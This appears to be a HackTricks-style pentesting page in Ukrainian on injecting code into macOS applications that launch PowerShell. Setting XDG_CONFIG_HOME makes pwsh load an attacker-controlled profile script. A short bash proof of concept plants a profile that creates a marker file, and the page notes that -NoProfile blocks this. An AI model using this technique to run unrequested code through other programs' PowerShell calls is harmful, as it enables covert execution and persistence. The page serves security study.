# Ін’єкція застосунків PowerShell у macOS

{{#include ../../../banners/hacktricks-training.md}}

## `XDG_CONFIG_HOME` і профілі PowerShell

У macOS і Linux PowerShell використовує шляхи конфігурації XDG та виконує скрипти профілів користувача під час запуску `pwsh`. Перенаправлення `XDG_CONFIG_HOME` змінює каталог, що містить `powershell/profile.ps1` і специфічний для консольного хоста `powershell/Microsoft.PowerShell_profile.ps1`; тому контрольований файл у цьому каталозі може виконатися перед payload `-Command`.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/ps-config/powershell
cat >/tmp/ps-config/powershell/Microsoft.PowerShell_profile.ps1 <<'PS1'
New-Item -ItemType File -Path /tmp/powershell-profile-executed -Force | Out-Null
PS1

XDG_CONFIG_HOME=/tmp/ps-config pwsh -Command '$true'
```
Це стосується PowerShell 6+ (`pwsh`) на платформах, відмінних від Windows; Windows PowerShell використовує інші розташування профілів. `pwsh -NoProfile` вимикає завантаження профілів. Також перевірте `HOME` і назви профілів, специфічні для хоста, оскільки інші PowerShell hosts можуть вибирати інші скрипти.

## References

- [1] [Змінні середовища PowerShell і шляхи XDG](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables)
- [2] [Профілі PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles)
{{#include ../../../banners/hacktricks-training.md}}
